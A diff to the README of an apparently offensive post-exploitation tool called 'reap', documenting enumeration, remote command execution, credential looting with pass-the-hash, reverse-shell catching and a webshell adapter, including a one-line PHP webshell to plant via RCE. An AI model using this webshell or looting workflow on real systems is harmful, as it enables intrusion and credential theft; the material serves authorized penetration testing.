@@ -46,9 +46,11 @@ The optional backends are only used for credential *testing* against those servi
 reap --db engagement.db                       # a named store that persists across hosts
 
 reap> register ssh 10.10.10.5 bob 'S3cret!'   # attach to your foothold (auto-fingerprints)
+reap> enum                                     # survey the box (processes/cron/services/net)
 reap> run                                      # collect loot, then correlate
 reap> creds                                    # recovered credentials + confirmed reuse
 reap> findings                                 # ranked findings (capabilities first)
+reap> !ls -la /root                            # run a command on the target ( or: interact )
 reap> report engagement.md                     # write the report
 ```
 
@@ -59,7 +61,7 @@ Pivoting? `register` the next host too. The loot store persists, so a credential
 reap is built in layers, each depending only on the one below it:
 
 ```
-Console        register / run / correlate / forward / report
+Console        register / enum / run / correlate / forward / shell / report
 Correlation    credential-to-service reuse (incl. pass-the-hash) + capability findings
 Modules        fingerprint + collection primitives + per-runtime plugins
 Loot store     SQLite: hosts, services, credentials, findings
@@ -80,11 +82,48 @@ Pick the adapter that matches the access you already have:
 | Raw reverse shell (nc-style) | `register listen <port>`, then fire your payload — reap catches it |
 | Raw bind shell | `register bind <host> <port>` |
 
-For a nologin web user such as `www-data`, the `webshell` adapter loots the host over the RCE while correlation finds the credential that gets you a real shell.
+### Using a web shell (HTTP RCE)
 
-Raw shells are driven with sentinel-wrapped commands over the socket (no PTY, so no interactive prompts). reap only runs commands that return, so collection works fine; for stability-sensitive work, upgrade to SSH. Add `--shell cmd` for a Windows `cmd.exe` shell.
+The `webshell` adapter turns an HTTP command-execution foothold into a full reap session — no reverse shell required. Every module runs over it unchanged, because it honors the same `exec` contract: reap sends each command as one HTTP request and reads stdout from the response body. Exit codes are recovered from an appended high-entropy sentinel, so a truncated response or a dead shell is reported as a failure rather than a fake success.
+
+Reach for it when your foothold is an **uploaded webshell** (arbitrary file upload into a PHP/JSP/ASPX app) or a **command-injection** endpoint (a page that executes a request parameter). Plant a minimal shell through your RCE, somewhere web-served:
+
+```php
+// PHP — the classic; JSP/ASPX equivalents work the same (any page that runs a request param)
+<?php system($_REQUEST["cmd"]); ?>
+```
+
+Then register the URL and `run` as usual:
+
+```
+reap> register webshell http://target/uploads/sh.php
+  registered webshell:target (active)
+reap> run
+```
+
+Flags, when the shell isn't a POSIX `?cmd=` POST:
+
+| Flag | Meaning | Default |
+|---|---|---|
+| `--param NAME` | the request parameter your shell reads | `cmd` |
+| `--method GET` | send via query string instead of POST | `POST` |
+| `--shell cmd` | Windows/IIS shell — exit-code wrapper uses `%errorlevel%`, not `$?` | `sh` |
+
+```
+reap> register webshell 'http://target/cmd.aspx' --param c --shell cmd     # IIS / ASP.NET
+reap> register webshell 'http://target/vuln.php?x=' --param x --method GET  # GET injection
+```
+
+Things worth knowing:
+
+- **TLS is not verified** (like `curl -k`) — target webshells are almost always self-signed or IP-based.
+- **The web user is usually nologin** (`www-data`, `iis apppool`). That is exactly the case this adapter exists for: reap loots the host over the RCE, then correlation surfaces the credential that gets you a real interactive shell.
+- **One request per command**, so a broad sweep can drag under PHP per-request time limits. For large runs prefer the driver: `python reap_run.py 'webshell:http://target/sh.php' engagement.db` (or `webshell:GET:cmd:http://target/sh.php` to set method/param).
+- **Don't point it at a blocking shell** — it expects request/response, not a webshell that pipes into a reverse connection.
 
 ### Catching a raw shell
+
+Raw shells are driven with sentinel-wrapped commands over the socket (no PTY, so no interactive prompts). reap only runs commands that return, so collection works fine; for stability-sensitive work, upgrade to SSH. Add `--shell cmd` for a Windows `cmd.exe` shell.
 
 reap can be the listener itself — you don't need a separate `nc`. Register the listener *first*, then fire your reverse-shell payload from the target through whatever RCE you have:
 
@@ -124,6 +163,8 @@ Windows `cmd.exe` reverse/bind shell: add `--shell cmd` (e.g. `register listen 4
 | `sessions` / `use <id>` / `hosts` | list sessions / switch the active one / list discovered hosts |
 | `fingerprint [id]` | re-probe OS, privilege, runtimes |
 | `run [id]` | collect loot, then correlate |
+| `enum [filter]` | linpeas-style survey (processes/cron/services/network/kernel); screen-only |
+| `!<cmd>` / `shell <cmd>` / `interact` | run commands on the target — one-off, or a line-based remote shell (`cd` persists) |
 | `correlate` | re-test credentials against services, including pass-the-hash |
 | `forward <rhost> <rport> [lport]` | tunnel a target-internal service to localhost over the SSH session |
 | `forwards` / `unforward <lport>` | list / close port forwards |
